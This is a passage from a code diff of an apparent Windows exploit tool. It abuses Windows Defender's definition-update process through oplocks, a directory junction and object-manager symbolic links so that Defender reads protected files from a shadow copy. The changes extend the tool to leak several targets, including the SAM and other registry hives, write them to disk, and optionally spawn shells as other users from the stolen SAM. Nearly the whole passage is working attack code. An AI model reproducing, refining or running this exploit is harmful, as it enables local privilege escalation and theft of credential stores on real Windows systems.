 			if (!hdir || hdir == INVALID_HANDLE_VALUE)
 			{
-				printf("Failed to open definition updates directory, error : %d", GetLastError());
+				//printf("Failed to open definition updates directory, error : %d", GetLastError());
 				goto cleanup;
 			}
 
 			hcurrentthread = OpenThread(THREAD_ALL_ACCESS, NULL, GetCurrentThreadId());
 			if (!hcurrentthread)
 			{
-				printf("Unexpected error while opening current thread, error : %d", GetLastError());
+				//printf("Unexpected error while opening current thread, error : %d", GetLastError());
 				goto cleanup;
 			}
 			threadargs.dirpath = updatepath;
@@ -3213,7 +3398,7 @@ int wmain(int argc, wchar_t* argv[])
 			threadargs.hevent = CreateEvent(NULL, FALSE, FALSE, NULL);
 			hthread = CreateThread(NULL, NULL, WDCallerThread, (LPVOID)&threadargs, NULL, &tid);
 
-			printf("Waiting for windows defender to create a new definition update directory...\n");
+			LogV("Waiting for windows defender to create a new definition update directory...\n");
 			wcscpy(newdefupdatedirname, L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\");
 			do {
 				ZeroMemory(buff, sizeof(buff));
@@ -3223,7 +3408,7 @@ int wmain(int argc, wchar_t* argv[])
 				HANDLE events[2] = { od.hEvent, threadargs.hevent };
 				if (WaitForMultipleObjects(2, events, FALSE, INFINITE) - WAIT_OBJECT_0)
 				{
-					printf("ServerMpUpdateEngineSignature ALPC call ended unexpectedly, RPC_STATUS : 0x%0.8X\n", threadargs.res);
+					//printf("ServerMpUpdateEngineSignature ALPC call ended unexpectedly, RPC_STATUS : 0x%0.8X\n", threadargs.res);
 					goto cleanup;
 				}
 				CloseHandle(od.hEvent);
@@ -3235,7 +3420,7 @@ int wmain(int argc, wchar_t* argv[])
 				wcscat(newdefupdatedirname, pfni->FileName);
 				break;
 			} while (1);
-			printf("Detected new definition update directory in %ws\n", newdefupdatedirname);
+			LogV("Detected new definition update directory in %ws\n", newdefupdatedirname);
 
 			wcscpy(updatelibpath, L"\\??\\");
 			wcscat(updatelibpath, updatepath);
@@ -3247,22 +3432,22 @@ int wmain(int argc, wchar_t* argv[])
 			ntstat = NtCreateFile(&hupdatefile, GENERIC_READ | DELETE | SYNCHRONIZE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, NULL, NULL);
 			if (ntstat)
 			{
-				printf("Failed to open update library, ntstatus : 0x%0.8X", ntstat);
+				//printf("Failed to open update library, ntstatus : 0x%0.8X", ntstat);
 				goto cleanup;
 			}
-			printf("Setting oplock on %ws\n", updatelibpath);
+			LogV("Setting oplock on %ws\n", updatelibpath);
 
 			ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
 			DeviceIoControl(hupdatefile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
 
 			if (GetLastError() != ERROR_IO_PENDING)
 			{
-				printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
+				//printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
 				goto cleanup;
 			}
-			printf("Waiting for oplock to trigger...\n");
+			LogV("Waiting for oplock to trigger...\n");
 			GetOverlappedResult(hupdatefile, &ovd, &transfersz, TRUE);
-			printf("oplock triggered !\n");
+			//printf("oplock triggered !\n");
 
 			//
 
@@ -3276,12 +3461,12 @@ int wmain(int argc, wchar_t* argv[])
 			wcscpy(&fri->FileName[0], newname);
 			if (!SetFileInformationByHandle(hupdatefile, FileRenameInfo, fri, renstructsz))
 			{
-				printf("Failed to move file from %ws to %ws error : %d", updatelibpath, newname, GetLastError());
+				//printf("Failed to move file from %ws to %ws error : %d", updatelibpath, newname, GetLastError());
 				goto cleanup;
 			}
 			free(fri);
 			fri = NULL;
-			printf("File moved  %ws to %ws\n", updatelibpath, newname);
+			//printf("File moved  %ws to %ws\n", updatelibpath, newname);
 			//
 
 
@@ -3289,11 +3474,11 @@ int wmain(int argc, wchar_t* argv[])
 			wcscat(newtmp, L".foo");
 			if (!MoveFile(updatepath, newtmp))
 			{
-				printf("Failed to move %ws to %ws, error : %d", updatepath, newtmp, GetLastError());
+				//printf("Failed to move %ws to %ws, error : %d", updatepath, newtmp, GetLastError());
 				goto cleanup;
 			}
 			dirmoved = true;
-			printf("Directory moved %ws to %ws\n", updatepath, newtmp);
+			//printf("Directory moved %ws to %ws\n", updatepath, newtmp);
 
 			wcscpy(wreparsedirpath, L"\\??\\");
 			wcscat(wreparsedirpath, updatepath);
@@ -3304,10 +3489,10 @@ int wmain(int argc, wchar_t* argv[])
 			ntstat = NtCreateFile(&hreparsedir, GENERIC_WRITE | DELETE | SYNCHRONIZE, &objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_DELETE_ON_CLOSE, NULL, NULL);
 			if (ntstat)
 			{
-				printf("Failed to recreate update directory, error : 0x%0.8X", ntstat);
+				//printf("Failed to recreate update directory, error : 0x%0.8X", ntstat);
 				goto cleanup;
 			}
-			printf("Recreated %ws\n", updatepath);
+			//printf("Recreated %ws\n", updatepath);
 
 
 			wcscpy(rptarget, L"\\BaseNamedObjects\\Restricted");
@@ -3329,7 +3514,7 @@ int wmain(int argc, wchar_t* argv[])
 			ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
 			if (!ov.hEvent)
 			{
-				printf("Failed to create event, error : %d", GetLastError());
+				//printf("Failed to create event, error : %d", GetLastError());
 				goto cleanup;
 			}
 			DeviceIoControl(hreparsedir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NULL, NULL, &ov);
@@ -3340,26 +3525,36 @@ int wmain(int argc, wchar_t* argv[])
 			}
 			if (GetLastError() != ERROR_SUCCESS)
 			{
-				printf("Failed to create reparse point, error : %d", GetLastError());
+				//printf("Failed to create reparse point, error : %d", GetLastError());
 				goto cleanup;
 			}
-			printf("Junction created %ws => %ws\n", updatepath, rptarget);
+			LogV("Junction created %ws => %ws\n", updatepath, rptarget);
 
-			ZeroMemory(nttargetfile, sizeof(nttargetfile));
-			wcscpy(nttargetfile, fullvsspath);
-			wcscat(nttargetfile, filestoleak[x]);
-
-			RtlInitUnicodeString(&objlinkname, L"\\BaseNamedObjects\\Restricted\\mpasbase.vdm");
-			RtlInitUnicodeString(&objlinktarget, nttargetfile);
-			InitializeObjectAttributes(&objattr, &objlinkname, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
-			ntstat = _NtCreateSymbolicLinkObject(&hobjlink, GENERIC_ALL, &objattr, &objlinktarget);
-			if (ntstat)
+			// Create one symlink per target while WD is frozen (oplock still held).
+			for (int si = 0; si < leakCount; si++)
 			{
-				printf("Failed to create object manager symbolic link, error : %d", GetLastError());
-				goto cleanup;
+				wchar_t objlinknamestr[MAX_PATH] = { 0 };
+				wcscpy(objlinknamestr, L"\\BaseNamedObjects\\Restricted\\");
+				wcscat(objlinknamestr, vdmfiles[si]);
+
+				wchar_t nttargetfile_i[MAX_PATH] = { 0 };
+				wcscpy(nttargetfile_i, fullvsspath);
+				wcscat(nttargetfile_i, opt.leakTargets[si].c_str());
+
+				UNICODE_STRING linkname_i = { 0 };
+				UNICODE_STRING linktarget_i = { 0 };
+				RtlInitUnicodeString(&linkname_i, objlinknamestr);
+				RtlInitUnicodeString(&linktarget_i, nttargetfile_i);
+				InitializeObjectAttributes(&objattr, &linkname_i, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+				ntstat = _NtCreateSymbolicLinkObject(&hobjlinks[si], GENERIC_ALL, &objattr, &linktarget_i);
+				if (ntstat)
+				{
+					//printf("Failed to create object manager symbolic link for %ws, error : 0x%0.8X\n", vdmfiles[si], ntstat);
+					goto cleanup;
+				}
+				LogV("Object manager link created %ws => %ws\n", linkname_i.Buffer, linktarget_i.Buffer);
 			}
-			printf("Object manager link created %ws => %ws\n", objlinkname.Buffer, objlinktarget.Buffer);
 
 			//TerminateThread(hthread, ERROR_SUCCESS); // kill the thread, don't care if it is still running
 			//CloseHandle(hthread);
@@ -3372,76 +3567,127 @@ int wmain(int argc, wchar_t* argv[])
 			hupdatefile = NULL;
 
 
-			wcscat(newdefupdatedirname, L"\\mpasbase.vdm");
-			do {
-				hleakedfile = CreateFile(newdefupdatedirname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-			} while (hleakedfile == INVALID_HANDLE_VALUE || !hleakedfile);
-			printf("Leaked file opened %ws\n", newdefupdatedirname);
-
-
 			CloseHandle(hdir);
 			hdir = NULL;
 			CloseHandle(hreparsedir);
 			hreparsedir = NULL;
-			CloseHandle(hobjlink);
-			hobjlink = NULL;
 
-			GetFileSizeEx(hleakedfile, &_filesz);
-			LockFileEx(hleakedfile, LOCKFILE_EXCLUSIVE_LOCK, NULL, _filesz.LowPart, _filesz.HighPart, &ovd2);
-			filelocked = true;
-			leakedfilebuff = malloc(_filesz.QuadPart);
-			if (!leakedfilebuff)
+			// Read each leaked file in turn (WD follows each symlink as it processes the update).
+			for (int ri = 0; ri < leakCount; ri++)
 			{
-				printf("Failed to allocate enough memory to copy leaked file !!!");
-				goto cleanup;
-			}
+				wchar_t readpath[MAX_PATH] = { 0 };
+				wcscpy(readpath, newdefupdatedirname);
+				wcscat(readpath, L"\\");
+				wcscat(readpath, vdmfiles[ri]);
 
-			if (!ReadFile(hleakedfile, leakedfilebuff, _filesz.QuadPart, &__readsz, NULL))
-			{
-				printf("Failed to read file, error : %d\n", GetLastError());
-				goto cleanup;
-			}
+				do {
+					hleakedfile = CreateFile(readpath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+				} while (hleakedfile == INVALID_HANDLE_VALUE || !hleakedfile);
+				LogV("Leaked file opened %ws\n", readpath);
 
-			UnlockFile(hleakedfile, NULL, NULL, NULL, NULL);
-			filelocked = false;
-			CloseHandle(hleakedfile);
-			printf("Read %d bytes\n", __readsz);
+				GetFileSizeEx(hleakedfile, &_filesz);
+				LockFileEx(hleakedfile, LOCKFILE_EXCLUSIVE_LOCK, NULL, _filesz.LowPart, _filesz.HighPart, &ovd2);
+				filelocked = true;
+				leakedfilebuff = malloc(_filesz.QuadPart);
+				if (!leakedfilebuff)
+				{
+					//printf("Failed to allocate enough memory to copy leaked file !!!");
+					goto cleanup;
+				}
 
-			ZeroMemory(copiedfilepath, sizeof(copiedfilepath));
+				if (!ReadFile(hleakedfile, leakedfilebuff, _filesz.QuadPart, &__readsz, NULL))
+				{
+					//printf("Failed to read file, error : %d\n", GetLastError());
+					goto cleanup;
+				}
 
-			UuidCreate(&uid);
-			UuidToStringW(&uid, &wuid);
-			wuid2 = (wchar_t*)wuid;
-			wchar_t env2[MAX_PATH] = { 0 };
-			wcscpy(env2, L"%TEMP%\\");
-			wcscat(env2, wuid2);
-
-			ExpandEnvironmentStrings(env2, copiedfilepath, sizeof(copiedfilepath) / sizeof(wchar_t));
-			//wcscat(copiedfilepath, L"\\");
-			//wcscat(copiedfilepath, PathFindFileName(filestoleak[x]));
-
-			hleakedfile = CreateFile(copiedfilepath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-			if (!hleakedfile || hleakedfile == INVALID_HANDLE_VALUE)
-			{
-				printf("Failed to create leaked file, error : %d", GetLastError());
-				goto cleanup;
-			}
-			if (!WriteFile(hleakedfile, leakedfilebuff, _filesz.QuadPart, &__readsz, NULL))
-			{
-				printf("Failed to write leaked file, error : %d", GetLastError());
+				UnlockFile(hleakedfile, NULL, NULL, NULL, NULL);
+				filelocked = false;
 				CloseHandle(hleakedfile);
 				hleakedfile = NULL;
-				// delete the file
-				DeleteFile(copiedfilepath);
-				goto cleanup;
+				//printf("Read %d bytes\n", __readsz);
+
+				ZeroMemory(copiedfilepath, sizeof(copiedfilepath));
+				if (!opt.outFileSingle.empty())
+				{
+					wcscpy(copiedfilepath, opt.outFileSingle.c_str());
+				}
+				else if (!opt.outDir.empty())
+				{
+					std::wstring base = FriendlyNameForKnownHive(opt.leakTargets[ri]);
+					if (base.empty())
+						base = BasenameOfPath(opt.leakTargets[ri]);
+					if (base.empty())
+						base = L"leak";
+
+					std::wstring out = opt.outDir;
+					if (!out.empty() && out.back() != L'\\' && out.back() != L'/')
+						out += L"\\";
+					out += base;
+					out += L".bin";
+					wcscpy(copiedfilepath, out.c_str());
+				}
+				else
+				{
+					UuidCreate(&uid);
+					UuidToStringW(&uid, &wuid);
+					wuid2 = (wchar_t*)wuid;
+					wchar_t env2[MAX_PATH] = { 0 };
+					wcscpy(env2, L"%TEMP%\\");
+					wcscat(env2, wuid2);
+					ExpandEnvironmentStrings(env2, copiedfilepath, sizeof(copiedfilepath) / sizeof(wchar_t));
+				}
+
+				hleakedfile = CreateFile(copiedfilepath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+				if (!hleakedfile || hleakedfile == INVALID_HANDLE_VALUE)
+				{
+					//printf("Failed to create output file, error : %d", GetLastError());
+					goto cleanup;
+				}
+				if (!WriteFile(hleakedfile, leakedfilebuff, _filesz.QuadPart, &__readsz, NULL))
+				{
+					//printf("Failed to write output file, error : %d", GetLastError());
+					CloseHandle(hleakedfile);
+					hleakedfile = NULL;
+					DeleteFile(copiedfilepath);
+					goto cleanup;
+				}
+				CloseHandle(hleakedfile);
+				hleakedfile = NULL;
+				free(leakedfilebuff);
+				leakedfilebuff = NULL;
+
+				if (hobjlinks[ri]) { CloseHandle(hobjlinks[ri]); hobjlinks[ri] = NULL; }
+
+				std::wstring friendly = FriendlyNameForKnownHive(opt.leakTargets[ri]);
+				if (friendly.empty())
+					friendly = BasenameOfPath(opt.leakTargets[ri]);
+				if (friendly.empty())
+					friendly = L"leak";
+				printf("%ws written at : %ws\n", friendly.c_str(), copiedfilepath);
+
+				// Save SAM path for hash extraction and optional cmd shell spawning.
+				if (!sawSam && FriendlyNameForKnownHive(opt.leakTargets[ri]) == L"SAM")
+				{
+					wcscpy(sampath, copiedfilepath);
+					sawSam = true;
+				}
 			}
-			CloseHandle(hleakedfile);
-			hleakedfile = NULL;
-			printf("Exploit succeeded.\n");
+
+			//printf("Exploit succeeded.\n");
 			SetEvent(hreleaseready);
 
-			printf("SAM file written at : %ws\n", copiedfilepath);
-			DoSpawnShellAsAllUsers(copiedfilepath);
+			if (opt.spawnCmdShell)
+			{
+				if (!sawSam)
+				{
+					printf("WARNING: --cmd requested but SAM was not leaked in this run. Use `--dump sam` or `--dump all`.\n");
+				}
+				else
+				{
+					DoSpawnShellAsAllUsers(sampath);
+				}
+			}
 
 			WaitForSingleObject(hthread, INFINITE);
 			CloseHandle(hthread);
@@ -3492,6 +3738,8 @@ cleanup:
 	}
 	if (leakedfilebuff)
 		free(leakedfilebuff);
+	for (int ci = 0; ci < 3; ci++)
+		if (hobjlinks[ci]) { CloseHandle(hobjlinks[ci]); hobjlinks[ci] = NULL; }
 	if (hcurrentthread)
 		CloseHandle(hcurrentthread);
 	if (needupdatedircleanup)
